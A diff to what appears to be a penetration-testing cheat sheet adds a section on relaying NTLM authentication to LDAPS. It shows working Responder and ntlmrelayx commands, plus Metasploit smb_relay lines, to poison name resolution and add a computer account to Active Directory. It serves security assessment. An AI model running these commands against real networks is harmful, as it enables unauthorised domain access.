@@ -69,6 +69,7 @@
   - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
   - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
     - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
+    - [LDAP signing not required and LDAP channel binding disabled](#ldap-signing-not-required-and-ldap-channel-binding-disabled)
     - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
     - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
     - [Drop the MIC](#drop-the-mic)
@@ -2161,6 +2162,23 @@ NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to 
 msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
+
+### LDAP signing not required and LDAP channel binding disabled
+
+During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:
+* LDAP signing not required (by default set to `Not required`)
+* LDAP channel binding is disabled. (by default disabled)
+* `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10 by default)
+
+Then we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder` and use `ntlmrelayx` to add our computer.
+```bash
+# On first terminal
+sudo ./Responder.py -I eth0 -wfrd -P -v
+
+# On second terminal
+sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
+```
+It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.
 
 ### SMB Signing Disabled and IPv4
 
